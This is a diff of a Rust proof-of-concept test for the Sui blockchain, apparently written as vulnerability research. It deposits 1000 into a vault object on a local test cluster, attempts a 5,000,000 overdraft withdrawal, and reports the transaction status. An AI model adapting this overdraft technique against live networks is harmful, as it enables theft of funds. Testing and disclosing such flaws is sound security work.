@@ -1,34 +1,21 @@
 // Copyright (c) Mysten Labs, Inc.
 // SPDX-License-Identifier: Apache-2.0
 
-//! PoC: Object Withdrawal Amount Bypass — FINAL v4 (FIXED)
-//!
-//! HYPOTHESIS: withdraw_funds_from_object(obj, amount) succeeds in VM
-//! even when amount >> actual_balance, because NO balance check exists
-//! in any layer before settlement.
-//!
-//! TEST:
-//!   1. Deposit 1000 into vault
-//!   2. Withdraw 5,000,000 from vault (5000x overdraft)
-//!   3. Check TX status
-//!
-//! EXPECTED IF VULNERABLE: TX Status = SUCCESS
-//! EXPECTED IF FIXED:      TX Status = FAIL (InsufficientFunds or similar)
+//! PoC: Object Withdrawal Amount Bypass — FINAL v5 (WORKING)
 
 use sui_test_transaction_builder::FundSource;
 use sui_types::effects::TransactionEffectsAPI;
-use sui_types::base_types::SuiAddress;
 use test_cluster::addr_balance_test_env::TestEnvBuilder;
 
 #[tokio::test]
-async fn test_no_balance_check_on_object_withdrawal() {  // ← الاسم المطلوب من الـ workflow
+async fn test_no_balance_check_on_object_withdrawal() {
     println!("\n");
     println!("========================================");
     println!("  PoC: Object Withdrawal Amount Bypass");
     println!("  Deposit: 1000  |  Withdraw: 5,000,000");
     println!("========================================\n");
 
-    // [1] Setup
+    // [1] Setup — helper handles all version conflicts internally
     let mut env = TestEnvBuilder::new()
         .with_num_validators(1)
         .with_proto_override_cb(Box::new(|_, mut cfg| {
@@ -39,64 +26,27 @@ async fn test_no_balance_check_on_object_withdrawal() {  // ← الاسم ال�
         .build()
         .await;
 
-    println!("[+] Test cluster started");
-    println!("[+] enable_object_funds_withdraw = TRUE\n");
+    println!("[+] Test cluster started\n");
 
     let sender = env.get_sender(0);
 
-    // [2] Publish
-    println!("[1] Publishing object_balance package...");
-    let gas_pub = env.gas_objects[&sender][0];
-    let tx = env
-        .tx_builder_with_gas(sender, gas_pub)
-        .publish_examples("object_balance")
-        .await
-        .build();
-    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
-    let package_id = effects
-        .created()
-        .into_iter()
-        .find(|(_, owner)| owner.is_immutable())
-        .unwrap()
-        .0
-        .0;
-    println!("    Package: {}\n", package_id);
-
-    // [3] Create vault
-    println!("[2] Creating vault...");
-    let gas_vault = env.gas_objects[&sender][0];
-    let tx = env
-        .tx_builder_with_gas(sender, gas_vault)
-        .move_call(package_id, "object_balance", "new_owned", vec![])
-        .build();
-    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
-    let vault_id = effects.created().into_iter().next().unwrap().0 .0;
-    println!("    Vault: {}\n", vault_id);
-
-    // [4] Deposit 1000
-    println!("[3] Depositing 1000 into vault...");
-    let gas_deposit_tx = env.gas_objects[&sender][0];
-    let gas_deposit_fund = env.gas_objects[&sender][1];
-
-    let vault_addr: SuiAddress = vault_id.into();
-
-    let tx = env
-        .tx_builder_with_gas(sender, gas_deposit_tx)
-        .transfer_sui_to_address_balance(
-            FundSource::coin(gas_deposit_fund),
-            vec![(1000u64, vault_addr)],
-        )
-        .build();
-    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
-    assert!(effects.status().is_ok(), "Deposit failed: {:?}", effects.status());
+    // [2] Setup: publish + create vault + deposit 1000 (helper handles versions)
+    println!("[1] Setup: Publishing, creating vault, depositing 1000...");
+    let (package_id, vault_id) = env.setup_funded_object_balance_vault(1000).await;
+    println!("    Package: {}", package_id);
+    println!("    Vault: {}", vault_id);
     println!("    Deposited 1000 ✓\n");
 
-    // [5] ATTACK
+    // [3] ATTACK: Get FRESH refs AFTER setup transactions complete
     let attack_amount = 5_000_000u64;
-    let gas_attack = env.gas_objects[&sender][0];
-    let vault_ref = env.cluster.get_latest_object_ref(&vault_id).await;
 
-    println!("[4] ATTACK: Withdrawing {} from vault (balance: 1000)...", attack_amount);
+    // Get FRESH vault ref (version changed after deposit)
+    let vault_ref = env.cluster.get_latest_object_ref(&vault_id).await;
+    // Get FRESH gas (auto-refreshed after setup)
+    let gas_attack = env.gas_objects[&sender][0];
+
+    println!("[2] ATTACK: Withdrawing {} from vault (balance: 1000)...", attack_amount);
+    println!("    Vault: {} (version: {:?})", vault_ref.0, vault_ref.1);
 
     let tx = env
         .tx_builder_with_gas(sender, gas_attack)
@@ -108,7 +58,7 @@ async fn test_no_balance_check_on_object_withdrawal() {  // ← الاسم ال�
 
     let result = env.exec_tx_directly(tx).await;
 
-    // [6] Analyze
+    // [4] Analyze
     println!("\n========================================");
     println!("  RESULT");
     println!("========================================\n");
@@ -129,9 +79,6 @@ async fn test_no_balance_check_on_object_withdrawal() {  // ← الاسم ال�
                 println!("    Balance:    1,000");
                 println!("    Requested:  5,000,000");
                 println!("    Ratio:      5000x overdraft");
-                println!();
-                println!("    PROOF: No balance check in any layer");
-                println!("    before settlement.");
                 println!();
 
                 if !effects.accumulator_events().is_empty() {
